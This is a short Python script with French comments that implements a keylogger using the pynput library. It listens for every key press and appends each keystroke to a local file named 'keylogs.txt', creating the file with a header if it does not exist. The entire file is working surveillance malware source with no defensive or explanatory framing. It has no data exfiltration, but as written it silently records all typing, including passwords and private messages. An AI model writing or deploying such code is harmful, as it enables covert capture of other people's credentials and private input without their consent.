from pynput.keyboard import Listener
import os

LOG_FILE = "keylogs.txt"

# Créer le fichier s'il n'existe pas
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("=== Keylogger Logs ===\n\n")

# Fonction pour capturer les frappes
def log_keystroke(key):
    key = str(key).replace("'", "")
    with open(LOG_FILE, "a") as f:
        f.write(f"{key}\n")

# Démarrage du keylogger
with Listener(on_press=log_keystroke) as listener:
    listener.join()